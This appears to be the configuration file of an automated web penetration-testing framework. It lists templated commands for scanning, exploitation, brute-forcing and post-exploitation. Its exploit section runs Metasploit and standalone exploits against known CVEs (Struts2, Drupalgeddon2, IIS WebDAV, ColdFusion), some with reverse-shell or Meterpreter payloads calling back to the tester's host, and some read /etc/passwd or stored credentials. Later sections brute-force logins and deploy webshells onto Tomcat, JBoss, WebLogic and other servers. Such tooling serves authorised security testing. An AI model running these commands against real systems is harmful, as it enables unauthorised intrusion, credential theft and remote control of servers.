#                 ["nmap -p3389 --open -sT -Pn ",""],

#                 #72
#                 ["nmap -p1-65535 --open -Pn ",""],

#                 #73
#                 ["nmap -p1-65535 -sU --open -Pn ",""],

#                 #74
#                 ["nmap -p161 -sU --open -Pn ",""],

#                 #75
#                 ["wget -O /tmp/rapidscan_temp_aspnet_elmah_axd --tries=1 ","/elmah.axd"],

#                 #76
#                 ["nmap -p445,137-139 --open -Pn ",""],

#                 #77
#                 ["nmap -p137,138 --open -Pn ",""],

#                 #78
#                 ["wapiti "," -f txt -o rapidscan_temp_wapiti"],

#                 #79
#                 ["nmap -p80 --script=http-iis-webdav-vuln -Pn ",""],
                
#                 #80
#                 ["whatweb "," -a 1"],

#                 #81
#                 ["amass enum -d ",""]
#             ]

#########################################################################################

#1
[check_host-ipv6]
name           = host-ipv6
category       = vuln
description    = Checks for existence of IPV6 address
tool           = host
command_1      = host [HOST]

#2
[check_aspnet-config-error]
name           = aspnet-config-error
category       = vuln
description    = Checks for ASP.Net Misconfiguration
tool           = wget
command_1      = wget --tries=1 [HOST]/%7C~.aspx

#3
[check_wordpress-check]
name           = wordpress-check
category       = vuln
description    = Checks for WordPress Installation
tool           = wget
command_1      = wget --tries=1 [HOST]/wp-admin

#4
[check_drupal-check]
name           = drupal-check
category       = vuln
description    = Checks for Drupal Installation
tool           = wget
command_1      = wget --tries=1 [HOST]/user

#5
[check_joomla-check]
name           = joomla-check
category       = vuln
description    = Checks for Joomla Installation
tool           = wget
command_1      = wget --tries=1 [HOST]/administrator

#6
[check_uniscan-robots-&-sitemap]
name           = uniscan-robots-&-sitemap
category       = vuln
description    = Checks for robots.txt & sitemap.xml
tool           = uniscan
command_1      = uniscan -e -u [HOST]

#7
[check_dnsrecon-multiple-zone-transfers]
name           = dnsrecon-multiple-zone-transfers
category       = vuln
description    = Attempts Multiple Zone Transfers on Nameservers
tool           = dnsrecon
command_1      = dnsrecon -d [HOST]

#8
[check_dnswalk-zone-transfer]
name           = dnswalk-zone-transfer
category       = vuln
description    = Attempts Zone Transfer
tool           = dnswalk
command_1      = dnswalk -d [HOST].

#9
[check_whois-admin-contact]
name           = whois-admin-contact
category       = vuln
description    = "Checks for Administrator's Contact Information"
tool           = whois
command_1      = whois [DOMAIN]

#10

#########################################################################################
# Vulnscan
#########################################################################################

[check_ssl-check]
name        = ssl-check 
category    = vulnscan
description = Check for SSL/TLS configuration
tool        = testssl.sh
command_1   = ./testssl.sh [URL]

[check_headers-analysis]
name        = headers-analysis
category    = vulnscan
description = Check HTTP headers
tool        = h2t
command_1   = python3 h2t.py scan [URL] -p description -vv -k

[check_vulnscan-multi-nikto]
name        = vulnscan-multi-nikto
category    = vulnscan
description = Check for multiple web vulnerabilities/misconfigurations
tool        = nikto
command_1   = nikto -host [IP] -port [PORT] [HTTPS true="-ssl"]

[check_webdav-internal-ip-disclosure]
name        = webdav-internal-ip-disclosure
category    = vulnscan
description = Check for WebDAV internal IP disclosure
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/webdav_internal_ip; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"

[check_webdav-website-content]
name        = webdav-website-content
category    = vulnscan
description = Detect webservers disclosing its content through WebDAV
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/webdav_website_content; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"

[check_http-put-check]
name        = http-put-check
category    = vulnscan
description = Detect the support of dangerous HTTP PUT method
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/http_put; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"

[check_iis-internal-ip-disclosure]
name        = iis-internal-ip-disclosure
category    = vulnscan
description = Check for IIS internal IP disclosure
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/iis_internal_ip; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; set VERBOSE true; run; exit"
context_1   = { 'web-server': 'Microsoft/IIS'}

[check_tomcat-user-enum]
name        = tomcat-user-enum
category    = vulnscan
description = Enumerate users on Tomcat 4.1.0-4.1.39, 5.5.0-5.5.27 and 6.0.0-6.0.18
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/tomcat_enum; set RHOSTS [HOST]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'Apache/Tomcat' }

[check_jboss-vulnscan-multi]
name        = jboss-vulnscan-multi
category    = vulnscan
description = Scan JBoss application server for multiple vulnerabilities
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/jboss_vulnscan; set RHOSTS [HOST]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'JBoss' }

[check_jboss-status-infoleak]
name        = jboss-status-infoleak
category    = vulnscan
description = Queries JBoss status servlet to collect sensitive information (JBoss 4.0, 4.2.2 and 4.2.3) 
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/jboss_status; set RHOSTS [HOST]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'JBoss' }

[check_jenkins-infoleak]
name        = jenkins-infoleak
category    = vulnscan
description = Enumerate a remote Jenkins-CI installation in an unauthenticated manner
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/jenkins_enum; set RHOSTS [HOST]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'Jenkins' }

[check_apache-optionsbleed-check]
name        = apache-optionsbleed-check
category    = vulnscan
description = Test for the Optionsbleed bug in Apache httpd (CVE-2017-9798)
tool        = optionsbleed
command_1   = ./optionsbleed -n 40 -a -u [URL]

[check_iis-shortname-scan]
name        = iis-shortname-scan
category    = vulnscan
description = Scan for IIS short filename (8.3) disclosure vulnerability
tool        = iis-shortname-scanner
command_1   = java -jar release/iis_shortname_scanner.jar [URL]

[check_cms-multi-vulnscan-cmsmap]
name        = cms-multi-vulnscan-cmsmap
category    = vulnscan
description = Check for vulnerabilities in CMS Wordpress, Drupal, Joomla
tool        = cmsmap
# Need to do apt-get update before to make sure update of exploitdb will work
command_1   = sudo apt-get update; /bin/bash -c 'yes | python3 cmsmap.py -v -F -f W --nosslcheck -t 10 [URL]'
context_1   = { 'web-cms': 'Wordpress' }
command_2   = sudo apt-get update; /bin/bash -c 'yes | python3 cmsmap.py -v -F -f J --nosslcheck -t 10 [URL]'
context_2   = { 'web-cms': 'Joomla' }
command_3   = sudo apt-get update; /bin/bash -c 'yes | python3 cmsmap.py -v -F -f D --nosslcheck -t 10 [URL]'
context_3   = { 'web-cms': 'Drupal' }

[check_wordpress-vulnscan]
name        = wordpress-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS Wordpress
tool        = wpscan
command_1   = wpscan --url [URL] --disable-tls-checks -e vp,vt,tt,cb,dbe,m,u1-50 -v 

[check_wordpress-vulnscan2]
name        = wordpress-vulnscan2
category    = vulnscan
description = Scan for vulnerabilities in CMS Wordpress
tool        = wpseku
command_1   = python3 wpseku.py -v --url [URL]

[check_joomla-vulnscan]
name        = joomla-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS Joomla
tool        = joomscan
command_1   = joomscan -u [URL] --enumerate-components

[check_wapiti-vulnscan]
name        = wapiti-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in web applications
tool        = wapiti
command_1   = wapiti -u [URL] -f html -o '[TOOLDIR]/tmp/wapiti-output.json'

[check_xss-vulnscan]
name        = xss-vulnscan
category    = vulnscan
description = Scan for XSS vulnerabilities
tool        = xsstrike
command_1   = python3 xsstrike.py -u "[URL]/search.php?q=query"

# [check_vulners-lookup]
# name        = vulners-lookup
# category    = vulnlookup
# description = Vulnerabilities lookup (language, framework, jslib, cms, server, appserver) on Vulners.com
# tool        = vulners-lookup
# apikey      = vulners
# command_1   = python3 vulners-lookup.py --apikey [APIKEY name="vulners"] '[WEB-LANGUAGE-VENDOR] [WEB-LANGUAGE-NAME] [WEB-LANGUAGE-VERSION]'
# context_1   = { 'web-language': 'any|version_known' }
# command_2   = python3 vulners-lookup.py --apikey [APIKEY name="vulners"] '[WEB-FRAMEWORK-VENDOR] [WEB-FRAMEWORK-NAME] [WEB-FRAMEWORK-VERSION]'
# context_2   = { 'web-framework': 'any|version_known' }
# command_3   = python3 vulners-lookup.py --apikey [APIKEY name="vulners"] '[WEB-JSLIB-VENDOR] [WEB-JSLIB-NAME] [WEB-JSLIB-VERSION]'
# context_3   = { 'web-jslib': 'any|version_known' }
# command_4   = python3 vulners-lookup.py --apikey [APIKEY name="vulners"] '[WEB-CMS-VENDOR] [WEB-CMS-NAME] [WEB-CMS-VERSION]'
# context_4   = { 'web-cms': 'any|version_known' }
# command_5   = python3 vulners-lookup.py --apikey [APIKEY name="vulners"] '[WEB-SERVER-VENDOR] [WEB-SERVER-NAME] [WEB-SERVER-VERSION]'
# context_5   = { 'web-server': 'any|version_known' }
# command_6   = python3 vulners-lookup.py --apikey [APIKEY name="vulners"] '[WEB-APPSERVER-VENDOR] [WEB-APPSERVER-NAME] [WEB-APPSERVER-VERSION]'
# context_6   = { 'web-appserver': 'any|version_known' }

# [check_cvedetails-lookup]
# name        = cvedetails-lookup
# category    = vulnlookup
# description = Vulnerabilities lookup (language, framework, jslib, cms, server, appserver) on Cvedetails.com
# tool        = cvedetails-lookup
# command_1   = python3 cvedetails-lookup.py --vendor "[WEB-LANGUAGE-VENDOR]" --product "[WEB-LANGUAGE-NAME]" --version "[WEB-LANGUAGE-VERSION]"
# context_1   = { 'web-language': 'any|version_known' }
# command_2   = python3 cvedetails-lookup.py --vendor "[WEB-FRAMEWORK-VENDOR]" --product "[WEB-FRAMEWORK-NAME]" --version "[WEB-FRAMEWORK-VERSION]"
# context_2   = { 'web-framework': 'any|version_known' }
# command_3   = python3 cvedetails-lookup.py --vendor "[WEB-JSLIB-VENDOR]" --product "[WEB-JSLIB-NAME]" --version "[WEB-JSLIB-VERSION]"
# context_3   = { 'web-jslib': 'any|version_known' }
# command_4   = python3 cvedetails-lookup.py --vendor "[WEB-CMS-VENDOR]" --product "[WEB-CMS-NAME]" --version "[WEB-CMS-VERSION]"
# context_4   = { 'web-cms': 'any|version_known' }
# command_5   = python3 cvedetails-lookup.py --vendor "[WEB-SERVER-VENDOR]" --product "[WEB-SERVER-NAME]" --version "[WEB-SERVER-VERSION]"
# context_5   = { 'web-server': 'any|version_known' }
# command_6   = python3 cvedetails-lookup.py --vendor "[WEB-APPSERVER-VENDOR]" --product "[WEB-APPSERVER-NAME]" --version "[WEB-APPSERVER-VERSION]"
# context_6   = { 'web-appserver': 'any|version_known' }

#########################################################################################
# Exploit
#########################################################################################
[check_jquery-fileupload-rce-cve2018-9206]
name        = jquery-fileupload-rce-cve2018-9206
category    = exploit
description = Exploit arbitrary file upload in jQuery File Upload widget <= 9.22 (CVE-2018-9206)
tool        = jqshell
command_1   = python3 jqshell.py -t [URL]/jQuery-File-Upload -s [WEBSHELLSDIR]/cmd.php
context_1   = { 'web-jslib': 'Jquery' }
command_2   = python3 jqshell.py -t [URL]/jQuery-File-Upload-9.22.0 -s [WEBSHELLSDIR]/cmd.php
context_2   = { 'web-jslib': 'Jquery' }
command_3   = python3 jqshell.py -t [URL]/jQuery-File-Upload -s [WEBSHELLSDIR]/cmd.php
context_3   = { 'web-jslib': 'Jquery UI' }
command_4   = python3 jqshell.py -t [URL]/jQuery-File-Upload-9.22.0 -s [WEBSHELLSDIR]/cmd.php
context_4   = { 'web-jslib': 'Jquery UI' }

[check_struts2-rce-cve2017-5638]
name        = struts2-rce-cve2017-5638
category    = exploit
description = Exploit Apache Struts2 Jakarta Multipart parser RCE (CVE-2017-5638)
tool        = jexboss
command_1   = python2.7 jexboss.py --auto-exploit --struts2 -u [URL] --cmd whoami --disable-check-updates
context_1   = { 'web-language': 'Java' }

[check_struts2-rce-cve2018-11776]
name        = struts2-rce-cve2018-11776
category    = exploit
description = Exploit Apache Struts2 misconfiguration RCE (CVE-2018-11776)
tool        = struts-pwn-cve2018-11776
command_1   = python3 struts-pwn.py -u [URL] 
context_1   = { 'web-language': 'Java' }

[check_struts2-rce-cve2017-9791]
name        = struts2-rce-cve2017-9791
category    = exploit
description = Exploit Apache Struts2 Plugin Showcase OGNL RCE (CVE-2017-9791)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use exploit/multi/http/struts2_code_exec_showcase; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set PAYLOAD cmd/unix/reverse; set LHOST [LOCALIP]; set LPORT 8443; set VERBOSE true; set AutoRunScript multi_console_command -c whoami,uname,exit; exploit; exit"
context_1   = { 'web-language': 'Java' }

[check_struts2-rce-cve2017-9805]
name        = struts2-rce-cve2017-9805
category    = exploit
description = Exploit Apache Struts2 REST Plugin XStream RCE (CVE-2017-9805)
tool        = struts-pwn-cve2017-9805
command_1   = python3 struts-pwn.py -u [URL]
context_1   = { 'web-language': 'Java' }

[check_jboss-misconfig-exploit]
name        = jboss-misconfig-exploit
category    = exploit
description = Try exploit misconfig on JBoss appserver pre-auth (jmx|web|admin-console,JMXInvokerServlet)
tool        = jexboss
command_1   = python2.7 jexboss.py --auto-exploit --jboss -u [URL] --cmd whoami --disable-check-updates
context_1   = { 'web-appserver': 'JBoss' }

[check_jboss-path-traversal-cve2014-7816]
name        = jboss-path-traversal-cve2014-7816
category    = exploit
description = Exploit path traversal on Jboss Wildfly 8.1.0 (only Windows) (CVE-2014-7816)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/wildfly_traversal; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'Jboss', 'os': 'windows' }

[check_glassfish-path-traversal-cve2017-1000028]
name        = glassfish-path-traversal-cve2017-1000028
category    = exploit
description = Exploit path traversal on Glassfish <= 4.1 (CVE-2017-1000028)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/glassfish_traversal; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; set FILEPATH /windows/win.ini; run; set FILEPATH /etc/passwd; run; exit"
context_1   = { 'web-appserver': 'Oracle/Glassfish' }

[check_jenkins-unauthenticated-console]
name        = jenkins-unauthenticated-console
category    = exploit
description = Detect and exploit unauthenticated Jenkins-CI script console
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/jenkins_command; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set COMMAND 'echo Unauthenticated Jenkins console vulnerability OK && whoami'; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'Jenkins' }

[check_jenkins-cli-deserialize-cve2015-8103]
name        = jenkins-cli-deserialize-cve2015-8103
category    = exploit
description = Exploit Java deserialization (unauthenticated) in Jenkins CLI RMI (CVE-2015-8103) 
tool        = jexboss
command_1   = python2.7 jexboss.py --auto-exploit --jenkins -u [URL] --cmd whoami --disable-check-updates
context_1   = { 'web-appserver': 'Jenkins' }

[check_coldfusion-xxe-cve2009-3960]
name        = coldfusion-xxe-cve2009-3960
category    = exploit
description = Exploit XXE in Coldfusion 7/8/9 (CVE-2009-3960)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/adobe_xml_inject; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set FILE /etc/passwd; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'Adobe/Coldfusion', 'os': 'linux' }
command_2   = sudo msfconsole -q -x "use auxiliary/scanner/http/adobe_xml_inject; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set FILE \\Windows\\win.ini; set VERBOSE true; run; exit"
context_2   = { 'web-appserver': 'Adobe/Coldfusion', 'os': 'windows' }

[check_coldfusion-path-traversal-cve2010-2861]
name        = coldfusion-path-traversal-cve2010-2861
category    = exploit
description = Exploit path traversal in Coldfusion (CVE-2010-2861)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use scanner/http/coldfusion_locale_traversal; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set FILE /etc/passwd; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'Adobe/Coldfusion', 'os': 'linux' }
command_2   = sudo msfconsole -q -x "use scanner/http/coldfusion_locale_traversal; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set FILE \\Windows\\win.ini; set VERBOSE true; run; exit"
context_2   = { 'web-appserver': 'Adobe/Coldfusion', 'os': 'windows' }

[check_coldfusion-path-traversal-cve2013-3336]
name        = coldfusion-path-traversal-cve2013-3336
category    = exploit
description = Exploit path traversal in Coldfusion 9/10 and extract creds (CVE-2013-3336)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/gather/coldfusion_pwd_props; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set VERBOSE true; run; exit"
context_1   = { 'web-appserver': 'Adobe/Coldfusion' }

[check_iis-webdav-win2003-bof]
name        = iis-webdav-win2003-bof
category    = exploit
description = Exploit Buffer overflow in WebDAV in IIS 6.0 on Windows 2003 R2 (CVE-2017-7269)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST [LOCALIP]; set LPORT 8443; set VERBOSE true; set AutoRunScript multi_console_command -c getuid,ps,exit; exploit; exit"
context_1   = { 'web-server': 'Microsoft/IIS', 'webdav': True, 'os': 'windows' }

[check_drupal-rce-drupalgeddon2]
name        = drupal-rce-drupalgeddon2
category    = exploit
description = Exploit Drupalgeddon2 RCE in CMS Drupal 7.x < 7.58 & 8.x < 8.1 (CVE-2018-7600)
tool        = drupwn
command_1   = /bin/bash -c 'echo -e "exploit CVE-2018-7600\nquit" | python3 drupwn --mode exploit --target [URL]'
context_1   = { 'web-cms': 'Drupal|>=7' }

[check_drupal-rce-rest-cve2019-6340]
name        = drupal-rce-rest-cve2019-6340
category    = exploit
description = Exploit REST RCE in CMS Drupal 8.5.x < 8.5.11 & 8.6.x < 8.6.10 (CVE-2019-6340)
tool        = drupwn
command_1   = /bin/bash -c 'echo -e "exploit CVE-2019-6340\nquit" | python3 drupwn --mode exploit --target [URL]'
context_1   = { 'web-cms': 'Drupal|>=8' } 

[check_joomla-comfields-sqli-rce]
name        = joomla-comfields-sqli-rce
category    = exploit
description = Exploit SQL injection to RCE in com_fields component in Joomla >= 3.7.0 (CVE-2017-8917)
tool        = metasploit
command_1   = sudo msfconsole -q -x "use unix/webapp/joomla_comfields_sqli_rce; set RHOSTS [IP]; set RHOST [IP]; set RPORT [PORT]; set PAYLOAD php/exec; set CMD 'echo Joomla comfields SQLi to RCE vulnerability OK && whoami'; set TARGETURI [URL]; set VERBOSE true; run; exit"
context_1   = { 'web-cms': 'Joomla' }

#########################################################################################
# Bruteforce
#########################################################################################
[check_bruteforce-htaccess]
name        = bruteforce-htaccess
category    = bruteforce
description = Bruteforce HTTP authentication (htaccess) if 401 Unauthorized returned
tool        = web-brutator
command_1   = python3 web-brutator.py --url [URL] --target jenkins -U "[WORDLISTSDIR]/usernames/usernames-short.txt" -P "[WORDLISTSDIR]/passwords/pass-medium.txt" --threads 40 --stoponsuccess
context_1   = { 'htaccess': True, 'auth_type': 'htaccess', 'auth_status': NO_AUTH }

[check_bruteforce-wordpress]
name        = bruteforce-wordpress
category    = bruteforce
description = Bruteforce Wordpress accounts (require detected username(s))
tool        = wpseku
command_1   = python3 wpseku.py --url [URL] --brute --user '[USERNAME]' --wordlist "[PASSLIST default="passwords/pass-medium.txt"]"
context_1   = { 'web-cms': 'Wordpress', 'auth_type': 'wordpress', 'auth_status': USER_ONLY }

#########################################################################################
# Postexploit
#########################################################################################
[check_appserver-postauth-deploy]
name        = appserver-postauth-deploy
category    = postexploit
description = Deploy a webshell on appserver (require credentials)
tool        = clusterd
command_1   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a axis2 --deploy "[WEBSHELLSDIR]/AxisInvoker.aar" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d -v '[WEB-APPSERVER-VERSION_MAJOR]'
context_1   = { 'web-appserver': 'Apache/Axis2|version_known', 'auth_type': 'axis2', 'auth_status': POST_AUTH }
command_2   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a axis2 --deploy "[WEBSHELLSDIR]/AxisInvoker.aar" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d
context_2   = { 'web-appserver': 'Apache/Axis2|version_unknown', 'auth_type': 'axis2', 'auth_status': POST_AUTH }

command_3   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a coldfusion --deploy "[WEBSHELLSDIR]/cmd.cfml" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d -v '[WEB-APPSERVER-VERSION_MAJOR]'
context_3   = { 'web-appserver': 'Adobe/Coldfusion|version_known', 'auth_type': 'coldfusion', 'auth_status': POST_AUTH }
command_4   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a coldfusion --deploy "[WEBSHELLSDIR]/cmd.cfml" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d
context_4   = { 'web-appserver': 'Adobe/Coldfusion|version_unknown', 'auth_type': 'coldfusion', 'auth_status': POST_AUTH }

command_5   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a jboss --deploy "[WEBSHELLSDIR]/cmd.jsp" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d -v '[WEB-APPSERVER-VERSION_MAJOR]'
context_5   = { 'web-appserver': 'Jboss|version_known', 'auth_type': 'jboss', 'auth_status': POST_AUTH }
command_6   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a jboss --deploy "[WEBSHELLSDIR]/cmd.jsp" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d
context_6   = { 'web-appserver': 'Jboss|version_unknown', 'auth_type': 'jboss', 'auth_status': POST_AUTH }

command_7   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a railo --deploy "[WEBSHELLSDIR]/cmd.cfml" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d -v '[WEB-APPSERVER-VERSION_MAJOR]'
context_7   = { 'web-appserver': 'Railo|version_known', 'auth_type': 'railo', 'auth_status': POST_AUTH }
command_8   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a railo --deploy "[WEBSHELLSDIR]/cmd.cfml" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d
context_8   = { 'web-appserver': 'Railo|version_unknown', 'auth_type': 'railo', 'auth_status': POST_AUTH }

command_9   = python2.7 ./clusterd.py -i [IP] -p [PORT] -a tomcat --deploy "[WEBSHELLSDIR]/cmd.war" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d -v '[WEB-APPSERVER-VERSION_MAJOR]'
context_9   = { 'web-appserver': 'Apache/Tomcat|version_known', 'auth_type': 'tomcat', 'auth_status': POST_AUTH }
command_10  = python2.7 ./clusterd.py -i [IP] -p [PORT] -a tomcat --deploy "[WEBSHELLSDIR]/cmd.war" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d
context_10  = { 'web-appserver': 'Apache/Tomcat|version_unknown', 'auth_type': 'tomcat', 'auth_status': POST_AUTH }

command_11  = python2.7 ./clusterd.py -i [IP] -p [PORT] -a weblogic --deploy "[WEBSHELLSDIR]/cmd.war" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d -v '[WEB-APPSERVER-VERSION_MAJOR]'
context_11  = { 'web-appserver': 'Oracle/Weblogic Server|version_known', 'auth_type': 'weblogic', 'auth_status': POST_AUTH }
command_12  = python2.7 ./clusterd.py -i [IP] -p [PORT] -a weblogic --deploy "[WEBSHELLSDIR]/cmd.war" --random-agent --usr-auth '[USERNAME]:[PASSWORD]' -d
context_12  = { 'web-appserver': 'Oracle/Weblogic Server|version_unknown', 'auth_type': 'weblogic', 'auth_status': POST_AUTH }

# [check_wordpress-shell-upload]
# name        = wordpress-shell-upload
# category    = vuln
# description = Upload shell on Wordpress (require admin credentials)
# tool        = wpforce
# command_1   = python2.7 yertle.py -u "[USERNAME]" -p "[PASSWORD]" -t [URL] -i
# context_1   = { 'web-cms': 'Wordpress', 'auth_type': 'wordpress', 'auth_status': POST_AUTH }

# [check_pwncat-shell-upload]
# name        = pwncat-shell-upload
# category    = vuln
# description = Upload shell on Webserver (require admin credentials)
# tool        = pwncat
# command_1   = pwncat -u [URL] -p [PORT] -f [WEBSHELLSDIR]/cmd.php -c [USERNAME]:[PASSWORD]